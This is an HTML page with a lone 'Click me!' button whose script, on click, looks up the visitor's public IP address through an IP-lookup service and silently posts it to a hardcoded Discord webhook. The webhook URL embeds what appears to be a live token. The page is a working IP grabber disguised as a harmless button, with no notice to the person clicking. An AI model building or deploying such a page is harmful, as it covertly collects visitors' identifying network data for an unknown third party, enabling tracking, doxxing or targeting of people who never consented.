<!DOCTYPE html>
<html>
  <body>
    <button onclick="sendIP()">Click me!</button>

    <script>
    async  function sendIP() {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        const url = "https://discord.com/api/webhooks/1185571622221000737/MUe95eWYmKWYv_dMlSUEFArA4h2IT4KcHKRiFAm5Q1ozXptee1ig-wWi9sXZN8iUEbz8";
        const data = { content: `IP Address: ${ipAddress}` };

        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(data)
        });
      }
    </script>
  </body>
</html>
